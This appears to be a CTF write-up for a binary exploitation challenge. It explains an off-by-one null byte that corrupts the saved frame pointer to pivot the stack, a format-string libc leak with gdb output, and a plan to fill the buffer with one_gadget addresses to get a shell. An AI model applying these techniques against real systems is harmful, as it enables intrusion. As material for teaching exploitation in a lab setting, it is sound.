[link(github.com)](https://github.com/DownUnderCTF/Challenges_2021_Public/blob/main/pwn/oversight/WRITEUP.md)

> Arch:     amd64-64-little\
> RELRO:    Partial RELRO\
> Stack:    No canary found\
> NX:       NX enabled\
> PIE:      PIE enabled
> 
`leave` is short for `mov rsp, rbp` and `pop rbp` . So if we write a null byte in the lowest byte of `rbp` of `echo` function (write function in `echo_inner` function, but actually we write into stack (array v2) of `echo`  function)

```c
echo(unsigned int a1)
{
  char v2[256]; // [rsp+0h] [rbp-100h] BYREF
  return echo_inner(v2, a1); // a1[(int)fread(a1, 1uLL, a2, stdin)] = 0;// vuln
}
```

the `get_num_bytes` func:

```assembly
...
call    echo
mov     r12, [rbp+var_8]
leave
retn
```

the rbp of `echo` function  will pointer to lower address (in v2 array area). Due to `leave, retn` is called 2 times, then the following `ret` instruction begins a rop chain

**The exploit**

------

use format string to leak libc.address. i found the offset is 11

```assembly
0x7fffffffdf38 ◂— 0xa786c6c2431 /* '1$llx\n' */		; %11
0x7fffffffdf40 —▸ 0x7ffff7dca2a0 (_IO_file_jumps) ◂— 0x0
0x7fffffffdf48 ◂— 0x0
0x7fffffffdf50 ◂— 0x0
0x7fffffffdf58 —▸ 0x7ffff7a6f4d3 (_IO_file_overflow+259)
0x7fffffffdf60 ◂— 0x10
0x7fffffffdf68 —▸ 0x7ffff7dce760 (_IO_2_1_stdout_)	; %17		
0x7fffffffdf70 —▸ 0x555555556075 ◂— 'Lets play a game'
0x7fffffffdf78 —▸ 0x7ffff7a62c42 (puts+418)
0x7fffffffdf80 —▸ 0x7ffff7de3b40 ◂— push   rbp
0x7fffffffdf88 ◂— 0x0
0x7fffffffdf90 —▸ 0x7fffffffdfb0 —▸ 0x555555555430 (__libc_csu_init)
0x7fffffffdf98 —▸ 0x5555555550e0 (_start)
0x7fffffffdfa0 —▸ 0x7fffffffdfb0 —▸ 0x555555555430 (__libc_csu_init)
0x7fffffffdfa8 —▸ 0x5555555550d5 (main+37)
0x7fffffffdfb0 —▸ 0x555555555430 (__libc_csu_init)
0x7fffffffdfb8 —▸ 0x7ffff7a03bf7 (__libc_start_main+231) ◂— mov    edi, eax; %27
```

we can use %17 or %27 to leak address. run gdb with libc

```assembly
0x0000000000021bf7 <+231>:   mov    edi,eax ; __libc_start_main
```

now the issue is i dont know where we write rop chain `pop_rdi, /bin/sh, system` because different between local and remote enviroment variables, will have different stack address. So i use one_gadget to full fill v2, then we dont worry about it.

